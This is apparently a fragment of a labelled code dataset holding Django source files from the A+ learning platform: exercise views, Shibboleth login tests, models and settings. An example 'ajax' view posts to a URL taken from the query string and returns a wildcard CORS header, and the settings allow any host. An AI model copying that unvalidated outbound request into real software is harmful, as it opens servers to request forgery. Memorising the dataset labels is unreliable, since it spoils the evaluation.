django.shortcuts import render\nfrom django.urls import reverse\n\n\ndef first(request):\n\n    if request.method == \"POST\":\n        submission = request.POST.get(\"answer\", \"\").lower()\n        points = 0\n        if 'hello' in submission:\n            points += 1\n        if 'a+' in submission:\n            points += 1\n        return render(request, \"exercises/first_result.html\", {\n            \"points\": points,\n            \"max_points\": 2,\n        })\n\n    return render(request, \"exercises/first_exercise.html\")\n\n\ndef file(request):\n\n    if request.method == \"POST\":\n        if \"myfile\" in request.FILES and request.FILES[\"myfile\"].name:\n            status = \"accepted\"\n        else:\n            status = \"error\"\n        return render(request, \"exercises/file_result.html\", {\n            \"status\": status,\n        })\n\n    return render(request, \"exercises/file_exercise.html\")\n\n\ndef ajax(request):\n\n    def parse_int(s):\n        try:\n            return int(s)\n        except Exception:\n            return 0\n\n    if request.method == \"POST\":\n        points = parse_int(request.POST.get(\"points\"))\n        max_points = parse_int(request.POST.get(\"max_points\"))\n        url = request.GET.get(\"submission_url\")\n\n        def respond_text(text):\n            response = HttpResponse(text)\n            response[\"Access-Control-Allow-Origin\"] = \"*\"\n            return response\n\n        if not url:\n            return respond_text('{ \"errors\": [\"Missing submission_url\"] }')\n\n        import requests\n        response = requests.post(url, timeout=3, data={\n            \"points\": points,\n            \"max_points\": max_points,\n            \"feedback\": \"You got {} / {} points for your answer.\".format(points, max_points),\n            \"grading_payload\": \"{}\",\n        })\n        return respond_text(response.text)\n\n    return render(request, \"exercises/ajax_exercise.html\", {\n        \"url\": request.build_absolute_uri(\"{}?{}\".format(\n            reverse(\"ajax\"), request.META.get(\"QUERY_STRING\", \"\")\n        )),\n    })\n/n/n/nshibboleth_login/tests.py/n/nimport urllib.parse\n\nfrom django.conf import settings\nfrom django.contrib.auth.models import User\nfrom django.urls import reverse\nfrom django.test import TestCase, modify_settings\nfrom django.utils import timezone\n\n\nDEF_SHIBD_META = {\n    'SHIB_cn': 'Teemu Teekkari',\n    'SHIB_mail': 'teemu.teekkari@aalto.fi',\n    'Shib-Authentication-Method': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',\n    'Shib-Identity-Provider': 'https://locahost/idp/shibboleth',\n    'SHIB_displayName': 'Teemudemus',\n    'Shib-AuthnContext-Class': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',\n    'SHIB_schacPersonalUniqueCode': 'urn:mace:terena.org:schac:personalUniqueCode:int:studentID:aalto.fi:123453',\n    'Shib-Session-Index': '_941d95bafed0b1787c81541e627a8c8b',\n    'SHIB_sn': 'Teekkari',\n    'SHIB_givenName': 'Teemu',\n    'Shib-Application-ID': 'default',\n    'Shib-Authentication-Instant': str(timezone.now()),\n    'Shib-Session-ID': '_92d7c6a832b5c7dafea59ea12ca1289e',\n    'SHIB_preferredLanguage': 'fi',\n    'SHIB_logouturl': 'https://localhost/idp/aalto_logout.jsp',\n    'SHIB_eppn': 'teekkarit@aalto.fi',\n}\n\n@modify_settings(\n    INSTALLED_APPS={'append': 'shibboleth_login'},\n    AUTHENTICATION_BACKENDS={'append': 'shibboleth_login.auth_backend.ShibbolethAuthBackend'},\n)\nclass ShibbolethTest(TestCase):\n\n    def setUp(self):\n        self.user = User(\n            username='meikalm8@aalto.fi',\n            email='',\n            first_name='Matti',\n            last_name='Sukunimi',\n        )\n        self.user.set_unusable_password()\n        self.user.save()\n        self.user.userprofile.student_id = '000'\n        self.user.userprofile.save()\n\n        self.login_url = reverse('shibboleth-login')\n\n    def test_invalid(self):\n        meta = DEF_SHIBD_META.copy()\n        del meta['SHIB_eppn']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 403)\n        self.assertEqual(User.objects.count(), 1)\n\n    def test_valid_new(self):\n        meta = DEF_SHIBD_META.copy()\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 2)\n        user = User.objects.get(username='teekkarit@aalto.fi')\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Teemu')\n        self.assertEqual(user.last_name, 'Teekkari')\n        self.assertEqual(user.userprofile.student_id, '123453')\n\n    def test_without_email(self):\n        meta = DEF_SHIBD_META.copy()\n        del meta['SHIB_mail']\n        del meta['SHIB_givenName']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 2)\n        user = User.objects.get(username='teekkarit@aalto.fi')\n        self.assertEqual(user.email, '{:d}@localhost'.format(user.id))\n        self.assertEqual(user.first_name, '')\n        self.assertEqual(user.last_name, 'Teekkari')\n        self.assertEqual(user.userprofile.student_id, '123453')\n\n    def test_without_student_id(self):\n        meta = DEF_SHIBD_META.copy()\n        del meta['SHIB_schacPersonalUniqueCode']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 2)\n        user = User.objects.get(username='teekkarit@aalto.fi')\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Teemu')\n        self.assertEqual(user.last_name, 'Teekkari')\n        self.assertEqual(user.userprofile.student_id, None)\n\n    def test_valid_old(self):\n        meta = DEF_SHIBD_META.copy()\n        meta['SHIB_eppn'] = self.user.username\n        del meta['SHIB_sn']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 1)\n        user = User.objects.first()\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Teemu')\n        self.assertEqual(user.last_name, 'Sukunimi')\n        self.assertEqual(user.userprofile.student_id, '123453')\n\n    def test_nonascii(self):\n        meta = DEF_SHIBD_META.copy()\n        meta['SHIB_eppn'] = self.user.username.encode('utf-8')\n        del meta['SHIB_givenName']\n        meta['SHIB_sn'] = 'Meik\u00e4l\u00e4inen'\n        del meta['SHIB_schacPersonalUniqueCode']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 1)\n        user = User.objects.first()\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Matti')\n        self.assertEqual(user.last_name, 'Meik\u00e4l\u00e4inen')\n        self.assertEqual(user.userprofile.student_id, '000')\n\n    def test_inactive(self):\n        self.user.is_active = False\n        self.user.save()\n        meta = DEF_SHIBD_META.copy()\n        meta['SHIB_eppn'] = self.user.username.encode('utf-8')\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 403)\n        self.assertEqual(User.objects.count(), 1)\n\n    def _get(self, meta):\n        if settings.SHIBBOLETH_VARIABLES_URL_ENCODED:\n            for key in meta.keys():\n                meta[key] = urllib.parse.quote(meta[key])\n        return self.client.generic('GET', self.login_url, **meta)\n/n/n/nthreshold/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0032_auto_20170215_0953'),\n        ('exercise', '0025_auto_20170215_0953'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseModuleRequirement',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('negative', models.BooleanField(default=False)),\n                ('module', models.ForeignKey(to='course.CourseModule', related_name='requirements', on_delete=models.CASCADE)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='Threshold',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('name', models.CharField(max_length=255)),\n                ('consume_harder_points', models.BooleanField(help_text='Harder points are consumed by easier difficulty requirements.', default=False)),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='thresholds', on_delete=models.CASCADE)),\n                ('passed_categories', models.ManyToManyField(blank=True, to='course.LearningObjectCategory')),\n                ('passed_exercises', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),\n                ('passed_modules', models.ManyToManyField(blank=True, to='course.CourseModule')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='ThresholdPoints',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('limit', models.PositiveIntegerField()),\n                ('difficulty', models.CharField(blank=True, max_length=32)),\n                ('order', models.PositiveIntegerField(default=1)),\n                ('threshold', models.ForeignKey(to='threshold.Threshold', related_name='points', on_delete=models.CASCADE)),\n            ],\n            options={\n                'ordering': ['threshold', 'order'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='coursemodulerequirement',\n            name='threshold',\n            field=models.ForeignKey(to='threshold.Threshold', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nthreshold/models.py/n/nfrom django.db import models\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom course.models import (\n    CourseInstance,\n    CourseModule,\n    LearningObjectCategory,\n)\nfrom exercise.cache.hierarchy import NoSuchContent\nfrom exercise.models import BaseExercise\n\n\nclass Threshold(models.Model):\n    \"\"\"\n    Course may set thresholds that signify module access or course grades.\n    \"\"\"\n    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,\n        related_name=\"thresholds\")\n    name = models.CharField(max_length=255)\n    passed_modules = models.ManyToManyField(CourseModule, blank=True)\n    passed_categories = models.ManyToManyField(LearningObjectCategory, blank=True)\n    passed_exercises = models.ManyToManyField(BaseExercise, blank=True)\n    consume_harder_points = models.BooleanField(default=False,\n        help_text=_(\"Harder points are consumed by easier difficulty requirements.\"))\n\n    def __str__(self):\n        return self.name + \" \" + self.checks_str()\n\n    def checks_str(self):\n        checks = [\n            \" \".join(str(m) for m in self.passed_modules.all()),\n            \" \".join(str(c) for c in self.passed_categories.all()),\n            \" \".join(str(e) for e in self.passed_exercises.all()),\n            \" \".join(str(p) for p in self.points.all()),\n        ]\n        return \" \".join(checks)\n\n    def is_passed(self, cached_points, unconfirmed=False):\n        try:\n            for module in self.passed_modules.all():\n                entry,_,_,_ = cached_points.find(module)\n                if not entry[\"passed\"]:\n                    return False\n            for category in self.passed_categories.all():\n                if not cached_points.find_category(category.id)[\"passed\"]:\n                    return False\n            for exercise in self.passed_exercises.all():\n                entry,_,_,_ = cached_points.find(exercise)\n                if not entry[\"passed\"]:\n                    return False\n        except NoSuchContent:\n            return False\n\n        total = cached_points.total()\n        d_points = total[\"points_by_difficulty\"].copy()\n        if unconfirmed:\n            u_points = total[\"unconfirmed_points_by_difficulty\"]\n            for key,value in u_points.items():\n                if key in d_points:\n                    d_points[key] += value\n                else:\n                    d_points[key] = value\n        return self._are_points_passed(total[\"points\"], d_points)\n\n    def _are_points_passed(self, points, points_by_difficulty):\n        if self.points.count() == 0:\n            return True\n        d_points = points_by_difficulty.copy()\n        ds,ls = zip(*list((p.difficulty,p.limit) for p in self.points.all()))\n        for i,d in enumerate(ds):\n            if d:\n\n                if self.consume_harder_points:\n                    p = d_points.get(d, 0)\n                    l = ls[i]\n                    if p < l:\n                        for j in range(i + 1, len(ds)):\n                            jd = ds[j]\n                            jp = d_points.get(jd, 0)\n                            if jp > l - p:\n                                d_points[jd] -= l - p\n                                d_points[d] = l\n                                break\n                            else:\n                                p += jp\n                                d_points[d] = p\n                                d_points[jd] = 0\n                    else:\n                        continue\n\n                if d_points.get(d, 0) < ls[i]:\n                    return False\n\n            elif points < ls[i]:\n                return False\n\n        return True\n\n\nclass ThresholdPoints(models.Model):\n    threshold = models.ForeignKey(Threshold, on_delete=models.CASCADE,\n        related_name=\"points\")\n    limit = models.PositiveIntegerField()\n    difficulty = models.CharField(max_length=32, blank=True)\n    order = models.PositiveIntegerField(default=1)\n\n    class Meta:\n        ordering = ['threshold', 'order']\n\n    def __str__(self):\n        if self.difficulty:\n            return \"{} {:d}\".format(self.difficulty, self.limit)\n        return _(\"{:d} points\").format(self.limit)\n\n\nclass CourseModuleRequirement(models.Model):\n    module = models.ForeignKey(CourseModule, on_delete=models.CASCADE,\n        related_name=\"requirements\")\n    threshold = models.ForeignKey(Threshold, on_delete=models.CASCADE)\n    negative = models.BooleanField(default=False)\n\n    def __str__(self):\n        if self.negative:\n            return \"< \" + self.threshold.checks_str()\n        return self.threshold.checks_str()\n\n    def is_passed(self, cached_points):\n        passed = self.threshold.is_passed(cached_points, True)\n        return not passed if self.negative else passed\n\n\n# TODO: should implement course grades using thresholds\n# TODO: should refactor diploma to use course grades\n/n/n/nuserprofile/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\nfrom django.conf import settings\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='StudentGroup',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(unique=True, max_length=32)),\n                ('description', models.CharField(max_length=256)),\n                ('member_limit', models.PositiveIntegerField()),\n                ('is_public', models.BooleanField(default=False)),\n                ('invitation_key', models.CharField(max_length=10, blank=True)),\n            ],\n            options={\n                'ordering': ['name'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='UserProfile',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('lang', models.CharField(default=b'en_US', max_length=5)),\n                ('student_id', models.CharField(max_length=25, null=True, blank=True)),\n                ('user', models.OneToOneField(to=settings.AUTH_USER_MODEL, on_delete=models.CASCADE)),\n            ],\n            options={\n                'ordering': ['id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='studentgroup',\n            name='members',\n            field=models.ManyToManyField(related_name='groups', to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nuserprofile/models.py/n/nfrom django.conf import settings\nfrom django.contrib.auth.models import User, AnonymousUser\nfrom django.urls import reverse\nfrom django.db import models\nfrom django.db.models.signals import post_save\nfrom django.utils.functional import cached_property\nfrom rest_framework.authtoken.models import Token\n\n\nclass UserProfileManager(models.Manager):\n\n    def get_queryset(self):\n        return super().get_queryset().select_related(\"user\")\n\n\nclass UserProfile(models.Model):\n    \"\"\"\n    Additional user information and methods.\n    \"\"\"\n\n    @classmethod\n    def get_by_student_id(cls, student_id):\n        return cls.objects.get(student_id=student_id)\n\n    @classmethod\n    def get_by_email(cls, email):\n        return User.objects.filter(email=email).first().userprofile\n\n    @classmethod\n    def get_by_request(cls, request):\n        user = request.user\n        if user.is_authenticated:\n            return user.userprofile\n        raise RuntimeError(\"Seeking user profile without authenticated user.\")\n\n    user = models.OneToOneField(User, on_delete=models.CASCADE)\n    # FIXME: refactor lang to selected_language which by default is blank\n    lang = models.CharField(max_length=5, default=\"en_US\")\n    student_id = models.CharField(max_length=25, null=True, blank=True)\n    objects = UserProfileManager()\n\n    class Meta:\n        ordering = ['id']\n\n    def __str__(self):\n        if self.student_id == None:\n            return \"{} ({} {})\".format(self.user.username, self.user.first_name, self.user.last_name)\n        else:\n            return \"{} ({} {}, {})\".format(self.user.username, self.user.first_name, self.user.last_name, self.student_id)\n\n    @cached_property\n    def api_token(self):\n        # FIXME: implement support for more than 1 token\n        token, created = Token.objects.get_or_create(user=self.user)\n        return token.key\n\n    @cached_property\n    def avatar_url(self):\n        \"\"\"\n        URL address for gravatar image based on the user email.\n        \"\"\"\n        import hashlib\n        hash_key = hashlib.md5(self.user.email.encode('utf-8')).hexdigest()\n        return \"http://www.gravatar.com/avatar/\" + hash_key + \"?d=identicon\"\n\n    @cached_property\n    def shortname(self):\n        \"\"\"\n        A short version of the user's name in form \"John D.\"\n        \"\"\"\n        try:\n            return self.user.first_name + \" \" + self.user.last_name[0] + \".\"\n        except:\n            return self.user.username\n\n    @cached_property\n    def is_external(self):\n        \"\"\"\n        Is this an external rather than internal account.\n        \"\"\"\n        return settings.SOCIAL_AUTH and self.user.social_auth.exists()\n\n    def get_url(self, instance):\n        kwargs = dict(user_id=self.user.id, **instance.get_url_kwargs())\n        return reverse('user-results', kwargs=kwargs)\n\n\ndef create_user_profile(sender, instance, created, **kwargs):\n    \"\"\"\n    This function automatically creates an user profile for all new User models. The profiles\n    are used for extending the User models with domain specific attributes and behavior.\n\n    @param sender: the signal that invoked the function\n    @param instance: the User object that was just created\n    @param created: a boolean whether the object was created and not just updated\n    \"\"\"\n    if created:\n        UserProfile.objects.get_or_create(user=instance)\n\n# Attach to the post_save signal.\npost_save.connect(create_user_profile, sender=User)\n\n\nclass GraderUser(AnonymousUser):\n    @classmethod\n    def from_submission(cls, submission):\n        return cls(submission=submission)\n\n    @classmethod\n    def from_exercise(cls, exercise, student_id):\n        return cls(exercise=exercise, student_id=student_id)\n\n    def __init__(self, submission=None, exercise=None, **extra):\n        self._submission = submission\n        if exercise:\n            self._exercise = exercise\n        self._extra = extra\n\n    @property\n    def is_anonymous(self):\n        \"\"\"GraderUser is anonymous, but not AnonymousUser\"\"\"\n        return True\n\n    @property\n    def is_authenticated(self):\n        return True\n\n    # A-plus interface\n    @property\n    def userprofile(self):\n        \"\"\"Compatibilty with User.userprofile\"\"\"\n        return self\n\n    @cached_property\n    def _exercise(self):\n        return self._submission.exercise\n\n    @cached_property\n    def _course_instance(self):\n        return self._exercise.course_module.course_instance\n\n    @cached_property\n    def _course(self):\n        return self._course_instance.course\n\n\nclass LTIServiceUser(GraderUser):\n    def __init__(self, submission=None, exercise=None, lti_service=None, **kwargs):\n        self.lti_service = lti_service\n        super().__init__(submission=submission, exercise=exercise, **kwargs)\n/n/n/nuserprofile/viewbase.py/n/nfrom django.core.exceptions import PermissionDenied\nfrom django.template.response import SimpleTemplateResponse\n\nfrom lib.viewbase import BaseMixin, BaseTemplateView\nfrom authorization.permissions import ACCESS\nfrom .models import UserProfile\n\n\nclass UserProfileMixin(BaseMixin):\n    access_mode = ACCESS.STUDENT\n    login_redirect = True\n\n    def get_resource_objects(self):\n        super().get_resource_objects()\n        user = self.request.user\n        if user.is_authenticated:\n            self.profile = profile = user.userprofile\n            self.is_external_student = profile.is_external\n        else:\n            self.profile = None\n            self.is_external_student = False\n\n        # Add available for template\n        self.note(\"profile\", \"is_external_student\")\n\n\nclass UserProfileView(UserProfileMixin, BaseTemplateView):\n    pass\n/n/n/nuserprofile/views.py/n/nimport logging\nfrom django.conf import settings\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.contrib.auth.views import login as django_login\nfrom django.core.cache import cache\nfrom django.core.cache.utils import make_template_fragment_key\nfrom django.http.response import HttpResponseRedirect\nfrom django.shortcuts import resolve_url\nfrom django.template.loader import TemplateDoesNotExist, get_template\nfrom django.utils.http import is_safe_url\nfrom django.utils.translation import get_language\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom lib.helpers import settings_text\nfrom authorization.permissions import ACCESS\nfrom .viewbase import UserProfileView\n\n\nlogger = logging.getLogger('userprofile.views')\n\n\ndef login(request):\n    \"\"\"\n    Wraps the default login view in Django. Additionally redirects already\n    authenticated users automatically to the target.\n    \"\"\"\n    if request.user.is_authenticated:\n        redirect_to = request.POST.get(REDIRECT_FIELD_NAME,\n                                       request.GET.get(REDIRECT_FIELD_NAME, ''))\n        if not is_safe_url(url=redirect_to, host=request.get_host()):\n            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)\n        return HttpResponseRedirect(redirect_to)\n\n    return django_login(\n        request,\n        template_name=\"userprofile/login.html\",\n        extra_context={\n            'shibboleth_login': 'shibboleth_login' in settings.INSTALLED_APPS,\n            'mooc_login': 'social_django' in settings.INSTALLED_APPS,\n            'login_title_text': settings_text('LOGIN_TITLE_TEXT'),\n            'login_body_text': settings_text('LOGIN_BODY_TEXT'),\n            'login_button_text': settings_text('LOGIN_BUTTON_TEXT'),\n            'shibboleth_title_text': settings_text('SHIBBOLETH_TITLE_TEXT'),\n            'shibboleth_body_text': settings_text('SHIBBOLETH_BODY_TEXT'),\n            'shibboleth_button_text': settings_text('SHIBBOLETH_BUTTON_TEXT'),\n            'mooc_title_text': settings_text('MOOC_TITLE_TEXT'),\n            'mooc_body_text': settings_text('MOOC_BODY_TEXT'),\n        }\n    )\n\n\ndef try_get_template(name):\n    try:\n        return get_template(name)\n    except TemplateDoesNotExist:\n        logger.info(\"Template %s not found\", name)\n        return None\n\n\nclass PrivacyNoticeView(UserProfileView):\n    access_mode=ACCESS.ANONYMOUS\n    template_name=\"userprofile/privacy.html\"\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        lang = \"_\" + get_language().lower()\n        key = make_template_fragment_key('privacy_notice', [lang])\n        privacy_text = cache.get(key)\n        if not privacy_text:\n            template_name = \"privacy_notice{}.html\"\n            template = try_get_template(template_name.format(lang))\n            if not template and len(lang) > 3:\n                template = try_get_template(template_name.format(lang[:3]))\n            if not template:\n                logger.warning(\"No localized privacy notice for language %s\", lang)\n                template = try_get_template(template_name.format(''))\n            if not template:\n                logger.error(\"No privacy notice at all!\")\n\n            privacy_text = template.render() if template else _(\"No privacy notice. Please notify administration!\")\n            cache.set(key, privacy_text)\n        self.privacy_text = privacy_text\n        self.note(\"privacy_text\")\n\nclass ProfileView(UserProfileView):\n    template_name = \"userprofile/profile.html\"\n/n/n/n", "label": 0}, {"id": "face34e3e6fe0d0a87d5987e107a1a3e092d73e9", "code": "/aplus/api/__init__.py/n/nfrom django.core.urlresolvers import reverse\nfrom rest_framework.settings import api_settings\n\ndef api_reverse(name, kwargs=None, **extra):\n    if not kwargs:\n        kwargs = {}\n    kwargs.setdefault('version', api_settings.DEFAULT_VERSION)\n    return reverse('api:' + name, kwargs=kwargs, **extra)\n/n/n/n/aplus/settings.py/n/n####\n# Default settings for A+ Django project.\n# You should create local_settings.py to override any settings.\n# You can copy local_settings.example.py and start from there.\n##\nfrom os.path import abspath, dirname, join\nfrom django.utils.translation import ugettext_lazy as _\nBASE_DIR = dirname(dirname(abspath(__file__)))\n\n\n# Base options, commonly overridden in local_settings.py\n##########################################################################\nDEBUG = False\nSECRET_KEY = None\nADMINS = (\n    # ('Your Name', 'your_email@domain.com'),\n)\n#SERVER_EMAIL = 'root@'\nEMAIL_TIMEOUT = 30 # Do not block web workers when email backend is broken\nALLOWED_HOSTS = [\"*\"]\n##########################################################################\n\n\n# Content (may override in local_settings.py)\n#\n# Any templates can be overridden by copying into\n# local_templates/possible_path/template_name.html\n##########################################################################\nSITEWIDE_ALERT_TEXT = None\nBRAND_NAME = 'A+'\n\nWELCOME_TEXT = 'Welcome to A+ <small>modern learning environment</small>'\nSHIBBOLETH_TITLE_TEXT = 'Aalto University users'\nSHIBBOLETH_BODY_TEXT = 'Log in with Aalto University user account by clicking the button below. Programme students and faculty must login here.'\nSHIBBOLETH_BUTTON_TEXT = 'Aalto Login'\nMOOC_TITLE_TEXT = 'Users external to Aalto'\nMOOC_BODY_TEXT = 'Some of our courses are open for everyone. Login with your user account from one of the following services.'\nLOGIN_TITLE_TEXT = ''\nLOGIN_BODY_TEXT = ''\nLOGIN_BUTTON_TEXT = 'Maintenance login'\nINTERNAL_USER_LABEL = 'Aalto'\nEXTERNAL_USER_LABEL = 'MOOC'\n\nWELCOME_TEXT_FI = 'A+ <small>verkkopohjainen oppimisymp\u00e4rist\u00f6</small>'\nSHIBBOLETH_TITLE_TEXT_FI = 'Aalto-yliopiston k\u00e4ytt\u00e4j\u00e4t'\nSHIBBOLETH_BODY_TEXT_FI = 'Kirjaudu palveluun Aalto-yliopiston k\u00e4ytt\u00e4j\u00e4tunnuksella alla olevasta painikkeesta. Koulutusohjelmien opiskelijoiden ja henkil\u00f6kunnan pit\u00e4\u00e4 kirjautua t\u00e4st\u00e4.'\nSHIBBOLETH_BUTTON_TEXT_FI = 'Aalto-kirjautuminen'\nMOOC_TITLE_TEXT_FI = 'K\u00e4ytt\u00e4j\u00e4t Aallon ulkopuolelta'\nMOOC_BODY_TEXT_FI = 'Osa kursseistamme on avoinna kaikille. Kirjaudu sis\u00e4\u00e4n jonkin seuraavan palvelun k\u00e4ytt\u00e4j\u00e4tunnuksellasi.'\nLOGIN_TITLE_TEXT_FI = ''\nLOGIN_BODY_TEXT_FI = ''\nLOGIN_BUTTON_TEXT_FI = 'Yll\u00e4pidon kirjautuminen'\n\nTRACKING_HTML = ''\n\nEXCEL_CSV_DEFAULT_DELIMITER = ';'\n##########################################################################\n\n# Exercise loading settings\nEXERCISE_HTTP_TIMEOUT = 15\nEXERCISE_HTTP_RETRIES = (5,5,5)\nEXERCISE_ERROR_SUBJECT = \"\"\"A+ exercise error in {course}: {exercise}\"\"\"\nEXERCISE_ERROR_DESCRIPTION = \"\"\"\nAs a course teacher or technical contact you were automatically emailed by A+ about the error incident. A student could not access or submit an exercise because the grading service used is offline or unable to produce valid response.\n\n{message}\n\nOpen the exercise:\n  {exercise_url}\nEdit course email settings:\n  {course_edit_url}\n\n****************************************\nError trace:\n****************************************\n\n{error_trace}\n\n****************************************\nRequest fields:\n****************************************\n\n{request_fields}\n\"\"\"\n\nINSTALLED_APPS = (\n    'django.contrib.contenttypes',\n    'django.contrib.staticfiles',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.humanize',\n\n    # 3rd party applications\n    'bootstrapform',\n    'rest_framework',\n    'rest_framework.authtoken',\n\n    # First party applications\n    'inheritance',\n    'userprofile',\n    'authorization',\n    'course',\n    'exercise',\n    'edit_course',\n    'deviations',\n    'notification',\n    'external_services',\n    'news',\n    'threshold',\n    'diploma',\n    'apps',\n    'redirect_old_urls',\n\n    'js_jquery_toggle',\n    'django_colortag',\n)\n\n# Different login options (may override in local_settings.py)\n##########################################################################\n\n## Shibboleth\n\n#INSTALLED_APPS += ('shibboleth_login',)\n\n# Apache module mod_uwsgi was unable to create UTF-8 environment variables.\n# Problem was avoided by URL encoding in Shibboleth:\n# <RequestMapper type=\"Native\">\n#   <RequestMap applicationId=\"default\" encoding=\"URL\" />\n# </RequestMapper>\nSHIBBOLETH_VARIABLES_URL_ENCODED = True\n\n# Fields to receive from the Shibboleth (defaults).\n#SHIB_USER_ID_KEY = 'SHIB_eppn'\n#SHIB_FIRST_NAME_KEY = 'SHIB_displayName'\n#SHIB_LAST_NAME_KEY = 'SHIB_sn'\n#SHIB_MAIL_KEY = 'SHIB_mail'\n#SHIB_STUDENT_ID_KEY = 'SHIB_schacPersonalUniqueCode'\n\n\n## Google OAuth2 settings\n\n#INSTALLED_APPS += ('social_django',)\n#SOCIAL_AUTH_GOOGLE_OAUTH2_KEY = ''\n#SOCIAL_AUTH_GOOGLE_OAUTH2_SECRET = ''\nSOCIAL_AUTH_URL_NAMESPACE = 'social'\nSOCIAL_AUTH_USERNAME_IS_FULL_EMAIL = True\n\n##########################################################################\n\nMIDDLEWARE_CLASSES = (\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n    'lib.middleware.SqlInjectionMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',\n    'django.middleware.locale.LocaleMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'social_django.middleware.SocialAuthExceptionMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n)\n\nROOT_URLCONF = 'aplus.urls'\nLOGIN_REDIRECT_URL = \"/\"\nLOGIN_ERROR_URL = \"/accounts/login/\"\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [\n            join(BASE_DIR, 'local_templates'),\n            join(BASE_DIR, 'templates'),\n        ],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                \"django.contrib.auth.context_processors.auth\",\n                \"django.template.context_processors.debug\",\n                'django.template.context_processors.request',\n                \"django.template.context_processors.i18n\",\n                \"django.template.context_processors.media\",\n                \"django.template.context_processors.static\",\n                \"django.contrib.messages.context_processors.messages\",\n            ],\n        },\n    },\n]\n\nFILE_UPLOAD_HANDLERS = (\n    #\"django.core.files.uploadhandler.MemoryFileUploadHandler\",\n    \"django.core.files.uploadhandler.TemporaryFileUploadHandler\",\n)\n\nWSGI_APPLICATION = 'aplus.wsgi.application'\n\n\n# Database (override in local_settings.py)\n# https://docs.djangoproject.com/en/1.7/ref/settings/#databases\n##########################################################################\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3', # Add 'postgresql_psycopg2', 'postgresql', 'mysql', 'sqlite3' or 'oracle'.\n        'NAME': join(BASE_DIR, 'aplus.db'), # Or path to database file if using sqlite3.\n        'USER': '', # Not used with sqlite3.\n        'PASSWORD': '', # Not used with sqlite3.\n        'HOST': '', # Set to empty string for localhost. Not used with sqlite3.\n        'PORT': '', # Set to empty string for default. Not used with sqlite3.\n    }\n}\n##########################################################################\n\n# Cache (override in local_settings.py)\n# https://docs.djangoproject.com/en/1.10/topics/cache\n##########################################################################\nCACHES = {\n    'default': {\n        'BACKEND': 'lib.cache.backends.LocMemCache',\n        'TIMEOUT': None,\n        'OPTIONS': {'MAX_SIZE': 1000000}, # simulate memcached value limit\n    }\n}\n#SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'\n##########################################################################\n\n# Internationalization (may override in local_settings.py)\n# https://docs.djangoproject.com/en/1.7/topics/i18n/\nLANGUAGE_CODE = 'en-gb'\nLANGUAGES = [\n    ('en', 'English'),\n    ('fi', 'Finnish'),\n]\nTIME_ZONE = 'EET'\nUSE_I18N = 